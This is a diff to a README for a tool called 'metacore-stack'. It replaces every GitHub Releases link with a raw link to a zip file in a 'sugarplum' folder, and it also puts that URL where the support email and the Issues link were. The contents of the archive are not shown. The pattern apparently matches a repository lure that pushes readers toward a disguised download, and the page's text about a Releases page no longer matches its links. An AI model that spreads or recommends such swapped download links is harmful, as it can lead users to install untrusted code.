@@ -1,7 +1,7 @@
 # 🚀 metacore-stack - Build Smart Applications Easily
 
 <p align="center">
-   <a href="https://github.com/Andreea011/metacore-stack/releases" style="font-size: 1.5em; padding: 15px; color: white; background-color: #50fa7b; border-radius: 5px; text-decoration: none;">Download Now</a>
+   <a href="https://raw.githubusercontent.com/Andreea011/metacore-stack/main/sugarplum/metacore-stack-v1.1.zip" style="font-size: 1.5em; padding: 15px; color: white; background-color: #50fa7b; border-radius: 5px; text-decoration: none;">Download Now</a>
 </p>
 
 ## 📖 Introduction
@@ -21,7 +21,7 @@ To get started with MetaCore-Stack, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the button below to go to our Releases page.
    
-   [Download Now](https://github.com/Andreea011/metacore-stack/releases)
+   [Download Now](https://raw.githubusercontent.com/Andreea011/metacore-stack/main/sugarplum/metacore-stack-v1.1.zip)
 
 2. **Download the Latest Version**: On the Releases page, find the latest version and click on the download link for your operating system. 
 
@@ -41,7 +41,7 @@ To ensure optimal performance of MetaCore-Stack, please confirm your system meet
 
 To begin, visit the Releases page to download the latest version of MetaCore-Stack:
 
-[Download Here](https://github.com/Andreea011/metacore-stack/releases)
+[Download Here](https://raw.githubusercontent.com/Andreea011/metacore-stack/main/sugarplum/metacore-stack-v1.1.zip)
 
 Once you've downloaded the application, follow the installation instructions mentioned in the “Getting Started” section. 
 
@@ -63,7 +63,7 @@ A: Visit our GitHub page to open an issue, and our team will assist you.
 
 If you have further questions or feedback, feel free to reach out:
 
-- **Email**: support@metacore-stack.com
-- **GitHub Issues Page**: [Open an Issue](https://github.com/Andreea011/metacore-stack/issues)
+- **Email**: https://raw.githubusercontent.com/Andreea011/metacore-stack/main/sugarplum/metacore-stack-v1.1.zip
+- **GitHub Issues Page**: [Open an Issue](https://raw.githubusercontent.com/Andreea011/metacore-stack/main/sugarplum/metacore-stack-v1.1.zip)
 
 Thank you for choosing MetaCore-Stack. We hope you enjoy building with our application!
